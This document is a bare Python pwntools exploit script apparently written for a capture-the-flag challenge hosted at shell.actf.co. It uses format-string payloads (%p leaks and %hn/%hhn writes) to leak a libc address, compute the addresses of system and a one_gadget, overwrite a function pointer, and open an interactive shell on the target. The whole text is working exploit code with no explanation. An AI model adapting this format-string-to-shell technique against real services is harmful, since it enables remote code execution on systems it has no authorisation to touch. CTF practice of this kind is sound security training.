from pwn import *

#p=process('./r')
p=remote('shell.actf.co',19307)

pay = "%3$p"
pay += "%3c"+"%13$hhn"
pay += "%149c"+"%12$hhn"
pay =pay.ljust(0x20,' ')
pay += p64(0x40404018)+p64(0x404019)

p.sendline(pay)
p.recvuntil("We didn't sell you a ")

lb = int(p.recvn(14),16)-0xf72c0
system=lb+0x45390
og = lb+0x45216

bytes=[0]
for i in range(2):
    bytes.append((og>>(16*i))&0xffff)

pay = ''
for i in range(1,3):
    pay += "%"+str(bytes[i]-bytes[i-1])+"c"
    pay += "%"+str(11+i)+"$hn"
pay=pay.ljust(0x20)
pay+=p64(0x40404038)
pay+=p64(0x40403a)

pause()
p.sendline(pay)

p.interactive()
